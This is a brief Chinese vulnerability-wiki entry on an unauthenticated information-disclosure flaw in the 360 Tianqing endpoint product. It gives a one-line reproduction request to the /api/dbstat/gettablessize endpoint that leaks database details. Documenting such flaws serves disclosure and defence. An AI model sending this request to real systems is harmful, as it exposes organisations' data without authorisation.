---
title: "360天擎 越权访问/数据库信息泄露"
date: 2026-10-16 09:06:18
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "360天擎"
tags:
  - "360天擎"
  - "未授权访问"
  - "信息泄露"
  - "越权"
  - "漏洞复现"
---
## 漏洞描述

360天擎 存在未授权越权访问，造成敏感信息泄露

## 漏洞影响

```
天擎
```

## 漏洞复现

```plain
GET /api/dbstat/gettablessize HTTP/1.1
```

![image-20220209200552429](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202092005904.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/360%E5%A4%A9%E6%93%8E-gettablessize-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md)
